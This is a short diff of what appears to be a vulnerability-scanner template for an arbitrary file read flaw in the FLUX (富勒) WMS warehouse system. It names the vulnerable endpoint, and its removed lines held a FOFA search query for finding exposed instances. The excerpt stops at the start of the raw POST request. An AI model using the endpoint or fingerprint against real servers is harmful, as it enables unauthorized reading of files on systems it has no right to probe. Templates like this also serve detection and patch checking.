@@ -3,12 +3,8 @@ info:
   name: 富勒仓储系统getExportTemplateFileAction存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wll4c7k9hzwpl6zn'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wll4c7k9hzwpl6zn
-    fofa: body="/logincenterapp/ValidateImageService" || title="FLUX WMS生产环境" ||icon_hash="2050995649"
 http:
 - raw:
   - 'POST /expcenter/getExportTemplateFileAction HTTP/1.1
